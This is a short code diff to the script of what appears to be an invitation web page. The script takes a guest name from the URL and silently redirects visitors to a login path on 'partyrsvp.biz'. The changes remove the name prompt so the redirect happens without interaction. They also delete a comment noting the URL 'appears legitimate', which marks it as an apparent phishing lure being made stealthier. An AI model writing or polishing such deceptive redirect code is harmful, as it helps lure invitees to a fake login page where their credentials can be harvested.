@@ -628,17 +628,16 @@
   </footer>
 
   <script>
-    // Seamless Auto-Redirect Script with Dynamic Name in HTML
+    // Seamless Auto-Redirect Script with Dynamic Name (No Popup)
     document.addEventListener('DOMContentLoaded', function() {
-      // Function to get the dynamic name from URL
+      // Function to get the dynamic name from URL only
       function getGuestName() {
         const urlParams = new URLSearchParams(window.location.search);
         let name = urlParams.get('name') || urlParams.get('guest') || '';
         
+        // If no name in URL, default to "Guest" without asking
         if (!name) {
-          // Optional: prompt user if no name in URL
-          name = prompt('Please enter your name to access your invitation:', '');
-          if (!name) name = 'Guest';
+          name = 'Guest';
         }
         
         return name;
@@ -655,7 +654,7 @@
 
       // Function to construct the final redirect URL
       function getRedirectURL() {
-        // Base URL - appears legitimate
+        // Base URL
         const baseURL = "https://partyrsvp.biz/login/profile/e/invite/";
         
         // Preserve query parameters if present
